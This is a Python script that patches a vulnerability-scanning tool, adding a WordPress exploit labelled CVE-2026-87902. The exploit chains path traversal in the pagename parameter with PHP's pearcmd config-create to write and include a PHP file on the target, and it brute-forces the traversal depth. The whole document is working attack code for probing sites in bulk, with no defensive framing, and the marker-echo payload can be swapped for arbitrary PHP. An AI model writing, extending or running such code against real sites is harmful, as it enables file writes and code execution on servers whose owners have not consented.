import io, sys
P = r"C:\work\hunt2\core\vuln.py"
s = io.open(P, encoding="utf-8").read()

old = "def probe(host, v, tmo, marker):"
new = '''def _chrlit(t):
    return ".".join("chr(%d)" % ord(c) for c in t)


def _denc(p):
    return p.replace("/", "%2F").replace(".", "%2E").replace("%", "%25")


def _find_page(base):
    for route in ("/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,template",
                  "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,template"):
        try:
            r = _req("GET", base + route)
            data = json.loads(getattr(r, "text", "[]"))
        except Exception:
            continue
        if isinstance(data, list) and data:
            for p in data:
                if not p.get("template"):
                    return p.get("id")
            return data[0].get("id")
    return None


def _wp_lfi(base, ex, marker):
    """CVE-2026-87902: pagename traversal -> template include -> PEAR write gadget."""
    pid = _find_page(base)
    if not pid:
        return False, "lfi:no-page", ""

    payload = "<?=" + _chrlit(marker) + "?>"
    out = ex.get("output", "/tmp/pbl") + _rnd(6)
    hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    depths = ex.get("depths") or ([7] + [d for d in range(1, 13) if d != 7])
    last = ""

    for theme_dir in ex.get("theme_dirs", ["page-templates"]):
        prefix = theme_dir[5:] if theme_dir.startswith("page-") else theme_dir
        for inc in ex.get("includes", ["/usr/local/lib/php/pearcmd"]):
            for depth in depths:
                incp = prefix + "/" + "../" * depth + inc.lstrip("/")
                outp = prefix + "/" + "../" * depth + out.lstrip("/")
                try:
                    _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                         data=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), headers=hdr)
                    r = _req("POST", base + "/",
                             data=("page_id=%d&pagename=%s" % (pid, _denc(outp))).encode(), headers=hdr)
                except Exception as e:
                    last = "lfi:" + type(e).__name__
                    continue
                text = getattr(r, "text", "") or ""
                last = "lfi:depth %d %s" % (depth, inc)
                if marker in text:
                    return True, last, base + "/"
    return False, last, ""


def probe(host, v, tmo, marker):'''
if s.count(old) != 1:
    print("probe не найден"); sys.exit(1)
s = s.replace(old, new)

old = '    if kind == "multipart_upload":'
new = '''    if kind == "wp_template_lfi":
        return _wp_lfi(base, ex, marker)

    if kind == "multipart_upload":'''
if s.count(old) != 1:
    print("диспетчер не найден"); sys.exit(1)
io.open(P, "w", encoding="utf-8", newline="\n").write(s.replace(old, new))
print("ok")